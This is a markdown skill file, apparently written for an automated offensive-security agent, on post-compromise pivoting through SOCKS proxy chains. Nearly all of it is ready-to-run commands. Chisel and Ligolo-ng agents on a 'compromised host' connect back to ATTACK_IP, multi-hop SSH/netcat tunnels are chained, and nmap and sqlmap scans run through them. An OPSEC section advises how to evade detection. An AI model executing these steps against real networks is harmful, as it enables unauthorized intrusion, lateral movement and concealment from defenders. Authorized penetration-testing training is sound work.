---
name: pivoting-socks
description: SOCKS proxy chains for advanced pivoting through complex network segments
version: 1.0.0
phase: post
category: lateral_movement
tags: [pivoting, socks, proxy, chain]
tools: [chisel, proxychains, ligolo-ng]
difficulty: advanced
opsec_level: silent
time_estimate: 120s
severity_if_found: critical
related_skills:
  - pivoting-ssh
  - tunneling-pivoting
  - lateral-movement
mitre_attack:
  - T1090
  - T1090.001
  - T1090.002
  - T1090.003
  - T1572
---

## When to Use

Use this skill when SSH is not available or when you need more flexible proxy
chaining — SOCKS proxies decouple the tunnel transport from the application
protocol. Chisel works over single TCP/HTTP (ideal for firewalled environments),
Ligolo-ng provides a Layer 3 VPN-like tunnel with a built-in tun interface, and
proxychains routes any TCP tool through a chain of SOCKS/HTTP proxies.

## Prerequisites

- A compromised host or egress point with outbound connectivity
- `chisel` binary uploaded (static Go binary, no dependencies)
- `proxychains4` installed on the attack machine
- `ligolo-ng` (proxy + agent) binaries uploaded to the target
- Outbound TCP on at least one port (80, 443, 8080 most reliable)
- Target subnet knowledge (CIDR ranges to route through the proxy)

## Procedure

```bash
# ═══════════════════════════════════════════════════════════
# 1. CHISEL — SOCKS tunnel over single TCP connection
# ═══════════════════════════════════════════════════════════
# On your attack machine (server):
./chisel server --port 8080 --reverse --socks5

# On the compromised host (client):
./chisel client ATTACK_IP:8080 R:socks

# Verify: Chisel exposes SOCKS5 on the server at 127.0.0.1:1080
curl -x socks5://127.0.0.1:1080 http://TARGET_INT_IP

# Chisel over HTTP (proxy-compatible, e.g. via a web proxy)
./chisel client --proxy https://corp-proxy:3128 http://ATTACK_IP:443 R:socks

# Chisel with authentication (basic auth on the tunnel itself)
./chisel server --port 8080 --reverse --socks5 --auth "tunnel_user:tunnel_pass"
./chisel client --auth "tunnel_user:tunnel_pass" ATTACK_IP:8080 R:socks

# Chisel with custom SOCKS port (default is 1080 on server side)
./chisel server --port 443 --reverse --socks5 --socks5-port 1270
./chisel client ATTACK_IP:443 R:socks

# ═══════════════════════════════════════════════════════════
# 2. PROXYCHAINS — Route tools through SOCKS/HTTP chains
# ═══════════════════════════════════════════════════════════
# Generate a comprehensive proxychains config
cat > /tmp/proxychains-custom.conf << 'PROXYCONF'
# proxychains.conf — strict chaining mode
strict_chain
proxy_dns on
tcp_read_time_out 15000
tcp_connect_time_out 8000

# SOCKS5 proxy chain (order matters)
[ProxyList]
socks5  127.0.0.1 1080
socks5  127.0.0.1 1081
http    127.0.0.1 8080
PROXYCONF

# Test the proxy chain
proxychains4 -f /tmp/proxychains-custom.conf curl -s http://checkip.amazonaws.com

# Nmap through proxychains (must use -sT, no ICMP/raw sockets)
proxychains4 -q nmap -sT -Pn -p 80,443,3306,3389 10.0.0.0/24 --open

# Nmap with service detection through chisel
proxychains4 -q nmap -sT -Pn -sV -p 80,443 10.0.0.10

# SQLmap through proxychains
proxychains4 -q sqlmap -u http://10.0.0.10/index.php?id=1 --batch

# Metasploit through proxychains (set Proxies in msfconsole)
# msfconsole
# set Proxies socks5:127.0.0.1:1080
# set ReverseAllowProxy true

# Round-robin: rotate through multiple proxies per connection
# Use dynamic_chain or random_chain for load distribution

# ═══════════════════════════════════════════════════════════
# 3. LIGOLO-NG — Advanced Layer 3 pivoting (tun interface)
# ═══════════════════════════════════════════════════════════
# On your attack machine (proxy):
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.0.0.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:8080

# On the compromised host (agent):
./agent -connect ATTACK_IP:8080 -ignore-cert

# Back on the attack proxy console, add routes and start tunnel:
ligolo-ng » session
ligolo-ng » ifconfig
ligolo-ng » add_route 10.0.1.0/24
ligolo-ng » start

# Verify: traffic to 10.0.1.0/24 is routed through the agent
ping -c 2 10.0.1.1
curl http://10.0.1.10:80

# Ligolo with multiple agents (tunnel each subnet independently)
./agent -connect ATTACK_IP:8080 -ignore-cert
# On proxy (add routes per session):
ligolo-ng » session 1
ligolo-ng » add_route 10.10.0.0/16
ligolo-ng » session 2
ligolo-ng » add_route 10.20.0.0/16

# Ligolo listener relay (expose agent-side port locally)
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# Now localhost:4444 forwards to agent:4444

# ═══════════════════════════════════════════════════════════
# 4. MULTI-HOP SOCKS CHAINS — Deep network traversal
# ═══════════════════════════════════════════════════════════
# Chain: Attack → DMZ → Internal → Restricted

# Hop 1: Chisel to DMZ host (exposes SOCKS on 1080)
./chisel server --port 8080 --reverse --socks5
./chisel client ATTACK_IP:8080 R:socks

# Hop 2: Use Hop1's SOCKS to reach internal host and start a second tunnel
proxychains4 -q ssh -D 1081 USER@INTERNAL_HOST -N -f

# Hop 3: Use Hop2's SOCKS to reach restricted host
proxychains4 -q ssh -o "ProxyCommand=nc -x 127.0.0.1:1081 %h %p" \
    -D 1082 USER@RESTRICTED_HOST -N -f

# Config for the full three-hop chain
cat > /tmp/three-hop.conf << 'CHAINCONF'
strict_chain
proxy_dns on
[ProxyList]
socks5 127.0.0.1 1080  # DMZ (Chisel)
socks5 127.0.0.1 1081  # Internal (SSH -D)
socks5 127.0.0.1 1082  # Restricted (SSH -D)
CHAINCONF

# Test the full chain
proxychains4 -f /tmp/three-hop.conf curl -s http://restricted-app.internal:8080

# ═══════════════════════════════════════════════════════════
# 5. SOCKS5 vs SOCKS4 — Protocol considerations
# ═══════════════════════════════════════════════════════════
# SOCKS5 features: UDP support, GSSAPI auth, IPv6, DNS resolution
# SOCKS4 features: TCP only, no auth, no IPv6, no UDP
# SOCKS4a: Like SOCKS4 but proxy resolves hostnames (useful when client can't)

# When to use SOCKS4 (legacy proxies):
# [ProxyList]
# socks4 127.0.0.1 1080

# When to fall back to HTTP CONNECT proxy:
# [ProxyList]
# http   127.0.0.1 8080
# socks5 127.0.0.1 1080

# ═══════════════════════════════════════════════════════════
# 6. HTTP PROXY FALLBACK — When SOCKS is blocked
# ═══════════════════════════════════════════════════════════
# Many corporate networks allow HTTP CONNECT through their forward proxy

# Chisel through HTTP CONNECT proxy:
./chisel client --proxy http://corp-proxy:3128 http://ATTACK_IP:443 R:socks

# SSH through HTTP CONNECT proxy (corkscrew or netcat)
apt install corkscrew
cat >> ~/.ssh/config << 'SSHPROXY'
Host bastion
    HostName bastion.internal
    Port 22
    ProxyCommand corkscrew corp-proxy 3128 %h %p
    User pentest
SSHPROXY

# Fallback order for proxychains (try HTTP if SOCKS fails):
# [ProxyList]
# socks5 127.0.0.1 1080
# http   127.0.0.1 8080  # fallback if SOCKS is down
```

## OPSEC Rules

- **CRITICAL**: Multiple proxy hops increase latency and detection surface — minimize chain length
- Chisel traffic is Go-TLS by default — blend by using port 443 with a valid SNI
- Ligolo-ng uses self-signed certs — use `-selfcert` on the proxy side, rotate certs between ops
- Proxychains injects itself via `LD_PRELOAD` — detectable on systems with runtime integrity checks
- Never use `strict_chain` for production scanning — one dead proxy kills the chain; use `dynamic_chain`
- Store custom proxychains configs in temp directories, not `/etc/`
- Remove ligolo tun interface and routes after use: `sudo ip link delete ligolo`
- Chisel agents left running are a detection beacon — implement agent heartbeat with timeout
- Set `tcp_read_time_out` and `tcp_connect_time_out` low (5-8s) to avoid hanging scans
- Log all proxy hops in case forensic rollback is needed

## Verification

- [ ] Chisel: `curl -x socks5://127.0.0.1:1080 http://INTERNAL_IP` returns content
- [ ] Proxychains: `proxychains4 -q nmap -sT -Pn -p 80 TARGET` shows open ports
- [ ] Ligolo: `ip route` shows ligolo route, `ping -c 1 10.0.0.1` responds
- [ ] Multi-hop: `proxychains4 -f three-hop.conf curl http://deep.internal` returns 200
- [ ] HTTP fallback: `curl -x http://corp-proxy:3128 http://checkip.amazonaws.com` works
- [ ] SOCKS5 UDP: `dig @8.8.8.8 example.com -x socks5h://127.0.0.1:1080` (proxychains)
- [ ] Ligolo listener relay: `nc -zvv localhost 4444` reaches agent-side service

## Pitfalls

- **Raw socket limitation**: Nmap through proxychains MUST use `-sT` — no SYN scan, no OS detection, no ICMP
- **DNS leaks**: Proxychains `proxy_dns on` only works with SOCKS4a/SOCKS5; test with `tcpdump port 53` to verify
- **Chisel version mismatch**: Server and client must match major versions — always verify with `--version`
- **Ligolo routing conflicts**: If the target subnet overlaps with your attack LAN, route resolution breaks — use `add_route` with specific /27 or /28
- **UDP through SOCKS**: Only SOCKS5 supports UDP; many pentest tools (DNS, SNMP) expect UDP — use Ligolo instead
- **Proxychains and sudo**: `LD_PRELOAD` doesn't cross `sudo` boundaries — prefix with `sudo -E proxychains4` or run as non-root
- **Chisel not closing cleanly**: Killed chisel processes may leave ports in `TIME_WAIT` — use `-holdreopen` for auto-reconnect
- **Port collisions**: Multiple SOCKS proxies default to 1080 — always specify distinct ports per hop
- **TLS certificate errors**: Chisel with `--proxy` may fail on intercepting proxies — add `--proxy-auth` or bypass MITM certs
- **Rate limiting**: Multi-hop scanning multiplies RTT per packet — tune nmap `-T` and `--min-rate` accordingly

## Output Format

```json
{
  "skill": "pivoting-socks",
  "tunnel_type": "chisel|ligolo|proxychains|multi-hop",
  "hops": 2,
  "chain": [
    {"type": "chisel", "entry": "ATTACK_IP:8080", "socks_port": 1080},
    {"type": "ssh", "entry": "INTERNAL_HOST", "socks_port": 1081}
  ],
  "status": "established|degraded|failed",
  "routed_subnets": ["10.0.0.0/24", "10.0.1.0/24"],
  "latency_ms_per_hop": [15, 32],
  "verified_services": ["10.0.0.10:80", "10.0.1.5:3306"],
  "resolved_at": "2026-07-13T12:00:00Z"
}
```
